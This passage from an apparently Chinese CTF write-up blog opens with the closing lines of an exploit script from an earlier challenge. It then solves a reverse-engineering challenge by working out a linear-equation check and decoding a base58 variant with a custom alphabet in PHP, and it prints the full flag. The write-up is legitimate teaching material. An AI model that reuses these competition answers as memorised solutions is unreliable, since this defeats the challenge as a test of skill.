class="line"></span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line"></span><br><span class="line">                sh.close()</span><br><span class="line"></span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">except:</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/14/%E8%B5%9B%E5%8D%9A%E6%9D%AF2019_Write_Up/87.png" alt="87"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h3><p>（emmm这一题偷懒了），</p>
<p>首先分析主函数</p>
<p>里面有两个check函数。进入checktime（）函数，关键代码是这里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> *(&amp;v5 + i) = rand();</span><br><span class="line">if ( 14766 * v11 + 18242 * v10 + 4657 * v9 + 22453 * v8 + 7236 * v7 + 28554 * v6 + 25606 * v5 + 12289 * v12 == 12977737</span><br><span class="line">  &amp;&amp; 27429 * v11 + 8015 * v10 + 16511 * v9 + 17180 * v8 + 27141 * v7 + 31813 * v6 + 7412 * v5 + 18249 * v12 == 15081473</span><br><span class="line">  &amp;&amp; 2846 * v11 + 28353 * v10 + 19864 * v9 + 27377 * v8 + 9006 * v7 + 13657 * v6 + 19099 * v5 + 25835 * v12 == 13554960</span><br><span class="line">  &amp;&amp; 1078 * v11 + 5007 * v10 + 6568 * v9 + 23034 * v8 + 10150 * v7 + 22949 * v6 + 32646 * v5 + 15255 * v12 == 11284005</span><br><span class="line">  &amp;&amp; 8010 * v11 + 15430 * v10 + 6657 * v9 + 1009 * v8 + 25691 * v7 + 15960 * v6 + 19493 * v5 + 29491 * v12 == 10759932</span><br><span class="line">  &amp;&amp; 4605 * v11 + 14468 * v10 + 5017 * v9 + 12805 * v8 + 22973 * v7 + 30584 * v6 + 12620 * v5 + 32085 * v12 == 12085266</span><br><span class="line">  &amp;&amp; 7478 * v11 + 6524 * v10 + 25994 * v9 + 16215 * v8 + 12864 * v7 + 20574 * v6 + 8882 * v5 + 14794 * v12 == 11323393</span><br><span class="line">  &amp;&amp; 15263 * v11 + 8821 * v10 + 25489 * v9 + 9598 * v8 + 26847 * v7 + 5175 * v6 + 6515 * v5 + 27411 * v12 == 11677607 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>一共8位字符，猜测前5位为<strong>flag{</strong>然后解个方程（也可以直接遍历后三个字符的所有可能，找到符合判断条件的）</p>
<p>得到    flag{Th3</p>
<p>然后来到关键的check函数，看到这里，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">while ( 1 )</span><br><span class="line"> &#123;</span><br><span class="line">   for ( j = 0; !v12[j]; ++j )</span><br><span class="line">     ;</span><br><span class="line">   if ( j &gt;= v11 )</span><br><span class="line">     break;</span><br><span class="line">   v9 = 0;</span><br><span class="line">   while ( j &lt; v11 )</span><br><span class="line">   &#123;</span><br><span class="line">     v1 = (v9 &lt;&lt; 8) + v12[j];</span><br><span class="line">     v12[j] = v1 / 58;</span><br><span class="line">     v9 = v1 % 58;</span><br><span class="line">     ++j;</span><br><span class="line">   &#125;</span><br><span class="line">   v2 = v5++;</span><br><span class="line">   s[v2] = v9;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>再加上用来取值的table  123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxy</p>
<p>意识到这是可能是个改变密码表的base58编码变形，于是偷懒，百度找了一个base58的编码解码脚本，改变密码表，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$encode = &quot;fQcoNZxMvNxAVW7UJh5vQNyyuaphLAGo8g&quot;;</span><br><span class="line">echo &quot;\n&quot;.$encode;</span><br><span class="line"></span><br><span class="line">$decode = base58_decode($encode);</span><br><span class="line">echo &quot;\n&quot;.$decode;</span><br><span class="line"></span><br><span class="line">function base58_encode($string)</span><br><span class="line">&#123;</span><br><span class="line">    $alphabet = &apos;123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ&apos;;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($string) === false || !strlen($string)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $bytes = array_values(unpack(&apos;C*&apos;, $string));</span><br><span class="line">    $decimal = $bytes[0];</span><br><span class="line">    for ($i = 1, $l = count($bytes); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, 256);</span><br><span class="line">        $decimal = bcadd($decimal, $bytes[$i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $output = &apos;&apos;;</span><br><span class="line">    while ($decimal &gt;= $base) &#123;</span><br><span class="line">        $div = bcdiv($decimal, $base, 0);</span><br><span class="line">        $mod = bcmod($decimal, $base);</span><br><span class="line">        $output .= $alphabet[$mod];</span><br><span class="line">        $decimal = $div;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($decimal &gt; 0) &#123;</span><br><span class="line">        $output .= $alphabet[$decimal];</span><br><span class="line">    &#125;</span><br><span class="line">    $output = strrev($output);</span><br><span class="line"></span><br><span class="line">    return (string) $output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function base58_decode($base58)</span><br><span class="line">&#123;</span><br><span class="line">    $alphabet = &apos;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&apos;;</span><br><span class="line">    $base = strlen($alphabet);</span><br><span class="line"></span><br><span class="line">    if (is_string($base58) === false || !strlen($base58)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    $indexes = array_flip(str_split($alphabet));</span><br><span class="line">    $chars = str_split($base58);</span><br><span class="line">    foreach ($chars as $char) &#123;</span><br><span class="line">        if (isset($indexes[$char]) === false) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $decimal = $indexes[$chars[0]];</span><br><span class="line">    for ($i = 1, $l = count($chars); $i &lt; $l; ++$i) &#123;</span><br><span class="line">        $decimal = bcmul($decimal, $base);</span><br><span class="line">        $decimal = bcadd($decimal, $indexes[$chars[$i]]);</span><br><span class="line">    &#125;</span><br><span class="line">    $output = &apos;&apos;;</span><br><span class="line">    while ($decimal &gt; 0) &#123;</span><br><span class="line">        $byte = bcmod($decimal, 256);</span><br><span class="line">        $output = pack(&apos;C&apos;, $byte).$output;</span><br><span class="line">        $decimal = bcdiv($decimal, 256, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解码得到</p>
<p>_sEcond_Be5t_Time_1s_n0w} </p>
<p>flag到手</p>
<p>后来发现，拿这程序去运行，只要flag的后面一半，也能过，所以一开始其实是忽略了这个check time（）函数。。。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">V</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">V</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
